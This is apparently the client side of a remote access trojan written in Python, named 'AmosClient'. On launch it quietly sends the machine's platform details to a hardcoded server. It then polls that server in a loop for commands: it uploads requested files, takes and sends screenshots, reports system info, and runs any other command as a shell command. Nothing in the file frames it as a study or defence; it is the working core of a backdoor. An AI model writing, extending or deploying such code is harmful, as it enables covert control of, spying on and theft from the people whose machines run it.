from urllib import request, parse
from ServerHandler import ServerHandler
from DataHarvester import DataHarvester
from GeneralFeatures import GeneralFeatures
import subprocess
import time
import os
import json



class AmosClient:


    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.server_handler = ServerHandler(ip, port)
        self.data_harvester = DataHarvester()
        self.general_features = GeneralFeatures()



    def create_json_payload(self, action, data):
        payload = {
            "action": action,
            "data": data
        }
        return json.dumps(payload)


    def start(self):

        try:
            action_param = "save_data"
            data_param = self.data_harvester.get_platform_info()
            json_payload = self.create_json_payload(action_param, data_param)
            self.server_handler.send_data(json_payload)
        except:
            pass


        while True:
            command = request.urlopen(f"http://{self.ip}:{self.port}").read().decode()
            print(command)

            if 'terminate' in command:
                break

            # Send file
            elif 'get' in command:
                self.server_handler.send_file(command)
                continue

            # Send file
            elif command == "connected":
                self.server_handler.send_data("active")
                continue

            elif command == "sys_info":
                system_info = self.data_harvester.get_platform_info()
                print(system_info)
                self.server_handler.send_data(system_info)
                continue

            elif command == "screenshot":
                self.general_features.screenshot()
                self.server_handler.send_file("screenshot.png")
                if os.path.isfile("screenshot.png"):
                    os.remove("screenshot.png")


            else:
                self.server_handler.run_command(command)
                time.sleep(1)



client = AmosClient("192.168.1.192", 8080)
client.start()
